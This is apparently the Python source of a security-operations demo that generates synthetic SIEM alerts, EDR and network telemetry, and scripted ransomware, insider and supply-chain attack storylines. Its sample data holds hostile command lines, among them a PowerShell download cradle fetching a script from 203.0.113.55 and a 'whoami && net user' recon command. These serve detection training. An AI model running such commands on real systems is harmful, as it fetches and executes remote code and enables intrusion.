"""
SENTINEL Live Data Stack — data generators
data_generators.py

Continuously-running threads that synthesize realistic security telemetry
and write it straight into SQLite:

  - AlertGenerator       : ~1 Splunk ES-style notable event per minute
  - EDRGenerator         : ~10 endpoint telemetry events per second
  - NetworkGenerator     : ~5 NetFlow/Zeek-style flow records per second
  - ThreatIntelGenerator : refreshes IOC reputation every 5 minutes
  - ScenarioEngine       : every couple of minutes, plays out one of three
                            multi-stage attack scenarios (ransomware,
                            insider threat, supply chain) whose EDR/network/
                            alert events are correlated by host and IOC so
                            the agent orchestrator has something coherent
                            to investigate.

All generators use plain threading (daemon threads) + sqlite3 with
check_same_thread=False, and publish lightweight notifications on the shared
EventBus so the WebSocket layer can push "new alert" / "events/sec" updates
without polling SQLite.

NOTE on timing: the spec scenario cadence is "every 2 hours, 10-30 minutes
long". For a live interactive demo that's impractical, so ScenarioEngine
compresses each scenario's storyline into ~60-90 seconds of wall-clock time
and runs the first one shortly after startup, then again every
SCENARIO_INTERVAL_SEC (default 2 hours, configurable).
"""

from __future__ import annotations

import json
import random
import threading
import time

from sentinel_live_common import BUS, get_conn, new_id, now, MITRE_MAP

# ---------------------------------------------------------------------------
# Tunable cadence (seconds between events, unless noted)
# ---------------------------------------------------------------------------

ALERT_INTERVAL_SEC = 60          # ~1/min
EDR_INTERVAL_SEC = 0.1            # 10/sec
NETWORK_INTERVAL_SEC = 0.2        # 5/sec
THREAT_INTEL_INTERVAL_SEC = 300   # every 5 min
SCENARIO_INTERVAL_SEC = 7200      # every 2 hours
SCENARIO_FIRST_DELAY_SEC = 45     # kick off the first scenario quickly on boot

# Keep the high-volume `events` table bounded over long runs.
EVENT_RETENTION_ROWS = 50_000
PRUNE_EVERY_N_WRITES = 500

# ---------------------------------------------------------------------------
# Reference data
# ---------------------------------------------------------------------------

USERS = ["jdoe", "asmith", "bjones", "mwilson", "klee", "tpatel", "rgarcia", "nkhan"]

HOST_PREFIXES = ["DESKTOP", "SERVER", "FILESERVER", "LAPTOP", "JUMP"]


def random_host() -> str:
    prefix = random.choice(HOST_PREFIXES)
    return f"{prefix}-{random.randint(0, 0xFFFF):04X}"


def random_internal_ip() -> str:
    return f"10.{random.randint(0, 4)}.{random.randint(0, 254)}.{random.randint(1, 254)}"


def random_external_ip() -> str:
    return f"{random.randint(20, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


ALERT_TYPES = list(MITRE_MAP.keys())

SEVERITY_BY_ALERT_TYPE = {
    "POWERSHELL_EXECUTION": ["medium", "high", "critical"],
    "SMB_LATERAL_MOVEMENT": ["high", "critical"],
    "DATA_EXFILTRATION": ["high", "critical"],
    "INSIDER_THREAT": ["medium", "high"],
    "CLOUD_MISCONFIG": ["low", "medium"],
    "C2_BEACON": ["high", "critical"],
    "RANSOMWARE_ENCRYPTION": ["critical"],
    "PRIVILEGE_ESCALATION": ["high", "critical"],
    "CREDENTIAL_DUMPING": ["high", "critical"],
}

PS_COMMANDS = [
    "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQ==",
    "powershell.exe -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.55/p.ps1')",
    "powershell.exe -nop -nonI -W Hidden -c $w=New-Object net.webclient;$w.proxy=...",
]


# ---------------------------------------------------------------------------
# Shared "world state" — lets ScenarioEngine bias EDR/Network generation
# toward whichever host/IOC is part of the active storyline.
# ---------------------------------------------------------------------------

class WorldState:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self.active_scenario: str | None = None
        self.focus_host: str | None = None
        self.focus_ip: str | None = None
        self.events_last_minute: dict[str, int] = {"edr": 0, "network": 0, "alerts": 0}

    def set_focus(self, scenario: str | None, host: str | None, ip: str | None) -> None:
        with self._lock:
            self.active_scenario = scenario
            self.focus_host = host
            self.focus_ip = ip

    def get_focus(self) -> tuple[str | None, str | None, str | None]:
        with self._lock:
            return self.active_scenario, self.focus_host, self.focus_ip

    def bump(self, key: str) -> None:
        with self._lock:
            self.events_last_minute[key] = self.events_last_minute.get(key, 0) + 1

    def snapshot_and_reset(self) -> dict[str, int]:
        with self._lock:
            snap = dict(self.events_last_minute)
            self.events_last_minute = {k: 0 for k in self.events_last_minute}
            return snap


WORLD = WorldState()


# ---------------------------------------------------------------------------
# Storage helpers
# ---------------------------------------------------------------------------

def _insert_event(conn, index_name: str, sourcetype: str, ts: float, host: str,
                   source: str, fields: dict) -> None:
    conn.execute(
        """INSERT INTO events (index_name, sourcetype, _time, host, source, fields_json, raw_text)
           VALUES (?,?,?,?,?,?,?)""",
        (index_name, sourcetype, ts, host, source, json.dumps(fields), json.dumps(fields)),
    )


def _insert_raw(conn, index_name: str, sourcetype: str, ts: float, host: str,
                 source: str, payload: dict) -> None:
    conn.execute(
        """INSERT INTO raw_events (index_name, sourcetype, _time, host, source, raw_json)
           VALUES (?,?,?,?,?,?)""",
        (index_name, sourcetype, ts, host, source, json.dumps(payload)),
    )


def _prune_events(conn) -> None:
    row = conn.execute("SELECT COUNT(*) AS c FROM events").fetchone()
    if row["c"] > EVENT_RETENTION_ROWS:
        excess = row["c"] - EVENT_RETENTION_ROWS
        conn.execute(
            "DELETE FROM events WHERE id IN (SELECT id FROM events ORDER BY id ASC LIMIT ?)",
            (excess,),
        )


# ---------------------------------------------------------------------------
# Alert generator
# ---------------------------------------------------------------------------

def generate_alert(conn, overrides: dict | None = None) -> dict:
    overrides = overrides or {}
    alert_type = overrides.get("alert_type") or random.choice(ALERT_TYPES)
    severity = overrides.get("severity") or random.choice(SEVERITY_BY_ALERT_TYPE.get(alert_type, ["medium"]))
    tactic, technique = MITRE_MAP.get(alert_type, ("Unknown", "T0000"))

    host = overrides.get("host") or random_host()
    user = overrides.get("user") or random.choice(USERS)
    src_ip = overrides.get("src_ip") or random_internal_ip()
    dest_ip = overrides.get("dest_ip") or random_external_ip()
    process_name = overrides.get("process_name") or (
        "powershell.exe" if "POWERSHELL" in alert_type else random.choice(["cmd.exe", "explorer.exe", "svchost.exe"])
    )
    command_line = overrides.get("command_line") or (
        random.choice(PS_COMMANDS) if "POWERSHELL" in alert_type else f"{process_name}"
    )

    alert = {
        "alert_id": new_id("ALT"),
        "alert_type": alert_type,
        "severity": severity,
        "host": host,
        "user": user,
        "src_ip": src_ip,
        "dest_ip": dest_ip,
        "process_name": process_name,
        "command_line": command_line,
        "mitre_tactic": tactic,
        "mitre_technique": technique,
        "status": "new",
        "_time": now(),
    }

    conn.execute(
        """INSERT INTO alerts (alert_id, alert_type, severity, host, user, src_ip, dest_ip,
                                process_name, command_line, mitre_tactic, mitre_technique, status, _time)
           VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
        (alert["alert_id"], alert["alert_type"], alert["severity"], alert["host"], alert["user"],
         alert["src_ip"], alert["dest_ip"], alert["process_name"], alert["command_line"],
         alert["mitre_tactic"], alert["mitre_technique"], alert["status"], alert["_time"]),
    )
    _insert_raw(conn, "sentinel_alerts", "sentinel:notable", alert["_time"], host, "alert_generator", alert)
    conn.commit()

    WORLD.bump("alerts")
    BUS.publish("alerts", {"type": "alert_new", "data": alert})
    return alert


def alert_generator_loop(stop_event: threading.Event) -> None:
    conn = get_conn()
    try:
        # Emit one immediately so the dashboard isn't empty on first load.
        generate_alert(conn)
        while not stop_event.is_set():
            if stop_event.wait(ALERT_INTERVAL_SEC):
                break
            generate_alert(conn)
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# EDR generator — process creation / network connection / file mod / registry
# ---------------------------------------------------------------------------

REGISTRY_KEYS = [
    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    r"HKLM\SYSTEM\CurrentControlSet\Services",
]

FILE_PATHS = [
    r"C:\Users\{user}\Documents\report.docx",
    r"C:\Users\{user}\Downloads\invoice.pdf",
    r"C:\Windows\Temp\update.tmp",
    r"C:\ProgramData\cache.dat",
]


def _edr_event(conn, ts: float, host: str | None = None) -> None:
    host = host or random_host()
    kind = random.choices(
        ["process_creation", "network_connection", "file_modification", "registry_change"],
        weights=[4, 3, 2, 1],
    )[0]
    user = random.choice(USERS)

    if kind == "process_creation":
        proc = random.choice(["explorer.exe", "chrome.exe", "outlook.exe", "powershell.exe", "cmd.exe", "svchost.exe"])
        fields = {
            "pid": random.randint(1000, 65000),
            "parent_pid": random.randint(1000, 65000),
            "process_name": proc,
            "command_line": proc,
            "user": user,
            "host": host,
            "_time": ts,
        }
    elif kind == "network_connection":
        fields = {
            "src_ip": random_internal_ip(),
            "dest_ip": random_external_ip(),
            "dest_port": random.choice([443, 80, 8080, 22, 3389]),
            "protocol": "tcp",
            "bytes_sent": random.randint(100, 50000),
            "bytes_received": random.randint(100, 200000),
            "host": host,
            "_time": ts,
        }
    elif kind == "file_modification":
        fields = {
            "file_path": random.choice(FILE_PATHS).format(user=user),
            "action": random.choice(["created", "modified", "deleted"]),
            "user": user,
            "host": host,
            "_time": ts,
        }
    else:  # registry_change
        fields = {
            "key_path": random.choice(REGISTRY_KEYS),
            "value_name": random.choice(["Updater", "OneDriveSync", "SecurityHealth"]),
            "value_data": r"C:\Users\Public\svc.exe",
            "action": random.choice(["created", "modified"]),
            "host": host,
            "_time": ts,
        }

    _insert_event(conn, "sentinel_endpoint", f"edr:{kind}", ts, host, "edr_generator", fields)
    WORLD.bump("edr")


def edr_generator_loop(stop_event: threading.Event) -> None:
    conn = get_conn()
    writes = 0
    try:
        while not stop_event.is_set():
            _, focus_host, _ = WORLD.get_focus()
            host = focus_host if (focus_host and random.random() < 0.5) else None
            _edr_event(conn, now(), host)
            writes += 1
            if writes % PRUNE_EVERY_N_WRITES == 0:
                _prune_events(conn)
            conn.commit()
            if stop_event.wait(EDR_INTERVAL_SEC):
                break
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# Network generator — flow records / DNS / HTTP
# ---------------------------------------------------------------------------

DNS_DOMAINS = ["login.microsoftonline.com", "outlook.office365.com", "update-cdn-secure.net",
               "drive.google.com", "raw.githubusercontent.com", "pastebin.com"]

HTTP_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/124.0",
    "python-requests/2.31",
]


def _network_event(conn, ts: float, host: str | None = None, focus_ip: str | None = None) -> None:
    host = host or random_host()
    kind = random.choices(["flow", "dns", "http"], weights=[3, 1, 1])[0]

    if kind == "flow":
        dest_ip = focus_ip or random_external_ip()
        fields = {
            "src_ip": random_internal_ip(),
            "dest_ip": dest_ip,
            "dest_port": random.choice([443, 53, 8443, 4444]),
            "protocol": "tcp",
            "bytes_in": random.randint(200, 5000),
            "bytes_out": random.randint(200, 5000) if not focus_ip else random.randint(20000, 90000),
            "packets_in": random.randint(1, 50),
            "packets_out": random.randint(1, 50),
            "duration": round(random.uniform(0.1, 12.0), 2),
            "host": host,
            "_time": ts,
        }
        sourcetype = "network:flow"
    elif kind == "dns":
        fields = {
            "query_name": random.choice(DNS_DOMAINS),
            "query_type": random.choice(["A", "AAAA", "TXT"]),
            "response_ip": focus_ip or random_external_ip(),
            "host": host,
            "_time": ts,
        }
        sourcetype = "network:dns"
    else:  # http
        fields = {
            "method": random.choice(["GET", "POST"]),
            "uri": random.choice(["/", "/api/v1/sync", "/owa/", "/update.ps1", "/upload"]),
            "user_agent": random.choice(HTTP_USER_AGENTS),
            "status_code": random.choice([200, 200, 200, 301, 403, 404]),
            "bytes_in": random.randint(200, 4000),
            "bytes_out": random.randint(200, 4000),
            "host": host,
            "_time": ts,
        }
        sourcetype = "network:http"

    _insert_event(conn, "sentinel_network", sourcetype, ts, host, "network_generator", fields)
    WORLD.bump("network")


def network_generator_loop(stop_event: threading.Event) -> None:
    conn = get_conn()
    writes = 0
    try:
        while not stop_event.is_set():
            _, focus_host, focus_ip = WORLD.get_focus()
            host = focus_host if (focus_host and random.random() < 0.5) else None
            ip = focus_ip if (focus_ip and random.random() < 0.5) else None
            _network_event(conn, now(), host, ip)
            writes += 1
            if writes % PRUNE_EVERY_N_WRITES == 0:
                _prune_events(conn)
            conn.commit()
            if stop_event.wait(NETWORK_INTERVAL_SEC):
                break
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# Threat intel generator
# ---------------------------------------------------------------------------

MALWARE_FAMILIES = ["LockBit", "Cobalt Strike", "Emotet", "QakBot", "AsyncRAT", "FIN7 Loader"]
THREAT_ACTORS = ["LockBit", "FIN7", "APT29", "Unattributed", "SupplyChainActor"]


def threat_intel_tick(conn) -> dict:
    ioc_type = random.choice(["ip", "domain", "hash"])
    if ioc_type == "ip":
        ioc = random_external_ip()
    elif ioc_type == "domain":
        ioc = f"{random.choice(['cdn', 'update', 'mail', 'sync'])}-{random.randint(100,999)}.net"
    else:
        ioc = "".join(random.choices("0123456789abcdef", k=64))

    record = {
        "ioc": ioc,
        "ioc_type": ioc_type,
        "reputation_score": round(random.uniform(0.1, 0.99), 2),
        "threat_actor": random.choice(THREAT_ACTORS),
        "malware_family": random.choice(MALWARE_FAMILIES),
        "first_seen": now() - random.randint(0, 86400 * 60),
        "last_seen": now(),
        "source": "threat_intel_generator",
    }
    conn.execute(
        """INSERT INTO threat_intel (ioc, ioc_type, reputation_score, threat_actor, malware_family,
                                      first_seen, last_seen, source)
           VALUES (?,?,?,?,?,?,?,?)""",
        (record["ioc"], record["ioc_type"], record["reputation_score"], record["threat_actor"],
         record["malware_family"], record["first_seen"], record["last_seen"], record["source"]),
    )
    conn.commit()
    BUS.publish("metrics", {"type": "threat_intel_update", "data": record})
    return record


def threat_intel_generator_loop(stop_event: threading.Event) -> None:
    conn = get_conn()
    try:
        while not stop_event.is_set():
            if stop_event.wait(THREAT_INTEL_INTERVAL_SEC):
                break
            threat_intel_tick(conn)
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# Scenario engine — multi-stage correlated attack storylines
# ---------------------------------------------------------------------------

def _scenario_ransomware(conn, stop_event: threading.Event) -> None:
    host = random_host()
    fileserver = "FILESERVER-" + f"{random.randint(0, 0xFFFF):04X}"
    c2_ip = "185.220.101.42"  # matches seeded threat_intel (LockBit C2)
    user = random.choice(USERS)

    WORLD.set_focus("ransomware", host, c2_ip)
    try:
        # Stage 1: malicious macro spawns encoded PowerShell
        _insert_event(conn, "sentinel_endpoint", "edr:process_creation", now(), host, "scenario", {
            "pid": random.randint(2000, 9000), "parent_pid": random.randint(1000, 2000),
            "process_name": "powershell.exe", "parent_process_name": "outlook.exe",
            "command_line": random.choice(PS_COMMANDS), "user": user, "host": host, "_time": now(),
        })
        conn.commit()
        if stop_event.wait(5):
            return

        # Stage 2: C2 beacon
        _insert_event(conn, "sentinel_network", "network:flow", now(), host, "scenario", {
            "src_ip": random_internal_ip(), "dest_ip": c2_ip, "dest_port": 443, "protocol": "tcp",
            "bytes_in": 1800, "bytes_out": 64000, "packets_in": 40, "packets_out": 55,
            "duration": 8.4, "host": host, "_time": now(),
        })
        conn.commit()

        # Stage 3: high-severity alert tying it together
        generate_alert(conn, {
            "alert_type": "POWERSHELL_EXECUTION", "severity": "critical", "host": host, "user": user,
            "src_ip": random_internal_ip(), "dest_ip": c2_ip, "process_name": "powershell.exe",
            "command_line": random.choice(PS_COMMANDS),
        })
        if stop_event.wait(15):
            return

        # Stage 4: mass file encryption
        for _ in range(6):
            _insert_event(conn, "sentinel_endpoint", "edr:file_modification", now(), host, "scenario", {
                "file_path": rf"C:\Users\{user}\Documents\file_{random.randint(1,999)}.docx.locked",
                "action": "modified", "user": user, "host": host, "_time": now(),
            })
            conn.commit()
            if stop_event.wait(3):
                return

        # Stage 5: lateral movement to a file server + corroborating alert
        _insert_event(conn, "sentinel_endpoint", "edr:network_connection", now(), host, "scenario", {
            "src_ip": random_internal_ip(), "dest_ip": random_internal_ip(), "dest_port": 445,
            "protocol": "tcp", "bytes_sent": 120000, "bytes_received": 4000, "host": host, "_time": now(),
        })
        generate_alert(conn, {
            "alert_type": "SMB_LATERAL_MOVEMENT", "severity": "critical", "host": fileserver, "user": user,
            "src_ip": random_internal_ip(), "dest_ip": random_internal_ip(),
            "process_name": "svchost.exe", "command_line": "svchost.exe -k netsvcs",
        })
        conn.commit()
    finally:
        WORLD.set_focus(None, None, None)


def _scenario_insider(conn, stop_event: threading.Event) -> None:
    host = random_host()
    user = random.choice(USERS)
    WORLD.set_focus("insider", host, None)
    try:
        # Off-hours login
        generate_alert(conn, {
            "alert_type": "INSIDER_THREAT", "severity": "medium", "host": host, "user": user,
            "src_ip": random_internal_ip(), "dest_ip": random_internal_ip(),
            "process_name": "winlogon.exe", "command_line": "winlogon.exe",
        })
        if stop_event.wait(8):
            return

        # Large file access events
        for _ in range(5):
            _insert_event(conn, "sentinel_endpoint", "edr:file_modification", now(), host, "scenario", {
                "file_path": rf"C:\Shares\Finance\Q{random.randint(1,4)}_records_{random.randint(1,99)}.xlsx",
                "action": "modified", "user": user, "host": host, "_time": now(),
            })
            conn.commit()
            if stop_event.wait(3):
                return

        # Cloud upload (large outbound HTTP) + exfil alert
        _insert_event(conn, "sentinel_network", "network:http", now(), host, "scenario", {
            "method": "POST", "uri": "/upload", "user_agent": "Mozilla/5.0 (cloud-sync)",
            "status_code": 200, "bytes_in": 500, "bytes_out": 250_000_000, "host": host, "_time": now(),
        })
        generate_alert(conn, {
            "alert_type": "DATA_EXFILTRATION", "severity": "high", "host": host, "user": user,
            "src_ip": random_internal_ip(), "dest_ip": random_external_ip(),
            "process_name": "chrome.exe", "command_line": "chrome.exe --profile-directory=Default",
        })
        conn.commit()
    finally:
        WORLD.set_focus(None, None, None)


def _scenario_supply_chain(conn, stop_event: threading.Event) -> None:
    host = random_host()
    backdoor_domain = "update-cdn-secure.net"  # matches seeded threat_intel
    user = random.choice(USERS)
    WORLD.set_focus("supply_chain", host, None)
    try:
        # Trusted-looking updater spawns a hidden shell
        _insert_event(conn, "sentinel_endpoint", "edr:process_creation", now(), host, "scenario", {
            "pid": random.randint(2000, 9000), "parent_pid": random.randint(1000, 2000),
            "process_name": "cmd.exe", "parent_process_name": "vendor_update.exe",
            "command_line": "cmd.exe /c whoami && net user", "user": user, "host": host, "_time": now(),
        })
        _insert_event(conn, "sentinel_network", "network:dns", now(), host, "scenario", {
            "query_name": backdoor_domain, "query_type": "A", "response_ip": random_external_ip(),
            "host": host, "_time": now(),
        })
        conn.commit()
        if stop_event.wait(6):
            return

        # Persistence via Run key
        _insert_event(conn, "sentinel_endpoint", "edr:registry_change", now(), host, "scenario", {
            "key_path": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "value_name": "VendorUpdateSvc", "value_data": r"C:\ProgramData\vendor_update.exe -silent",
            "action": "created", "host": host, "_time": now(),
        })
        conn.commit()
        if stop_event.wait(10):
            return

        # Privilege escalation alert
        generate_alert(conn, {
            "alert_type": "PRIVILEGE_ESCALATION", "severity": "critical", "host": host, "user": user,
            "src_ip": random_internal_ip(), "dest_ip": random_external_ip(),
            "process_name": "vendor_update.exe", "command_line": "vendor_update.exe -silent",
        })
        conn.commit()
    finally:
        WORLD.set_focus(None, None, None)


SCENARIOS = {
    "ransomware": _scenario_ransomware,
    "insider": _scenario_insider,
    "supply_chain": _scenario_supply_chain,
}
_SCENARIO_ORDER = ["ransomware", "insider", "supply_chain"]


def scenario_engine_loop(stop_event: threading.Event) -> None:
    conn = get_conn()
    idx = 0
    try:
        if stop_event.wait(SCENARIO_FIRST_DELAY_SEC):
            return
        while not stop_event.is_set():
            name = _SCENARIO_ORDER[idx % len(_SCENARIO_ORDER)]
            idx += 1
            BUS.publish("metrics", {"type": "scenario_start", "data": {"scenario": name, "_time": now()}})
            SCENARIOS[name](conn, stop_event)
            BUS.publish("metrics", {"type": "scenario_end", "data": {"scenario": name, "_time": now()}})
            if stop_event.wait(SCENARIO_INTERVAL_SEC):
                break
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# Throughput counter — feeds the "events/sec" status line
# ---------------------------------------------------------------------------

def throughput_loop(stop_event: threading.Event) -> None:
    conn = get_conn()
    try:
        while not stop_event.is_set():
            if stop_event.wait(10):
                break
            snap = WORLD.snapshot_and_reset()
            total = sum(snap.values())
            rate = total / 10.0
            conn.execute(
                "INSERT INTO metrics (metric_name, metric_value, _time) VALUES (?,?,?)",
                ("events_per_sec", rate, now()),
            )
            conn.commit()
            BUS.publish("metrics", {"type": "throughput", "data": {"events_per_sec": round(rate, 2), "_time": now()}})
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# Entry point used by start_live_stack.py
# ---------------------------------------------------------------------------

def start_all(stop_event: threading.Event) -> list[threading.Thread]:
    loops = [
        alert_generator_loop,
        edr_generator_loop,
        network_generator_loop,
        threat_intel_generator_loop,
        scenario_engine_loop,
        throughput_loop,
    ]
    threads = []
    for loop in loops:
        t = threading.Thread(target=loop, args=(stop_event,), daemon=True, name=loop.__name__)
        t.start()
        threads.append(t)
    return threads


if __name__ == "__main__":
    from sentinel_live_common import init_db
    init_db()
    stop = threading.Event()
    start_all(stop)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop.set()
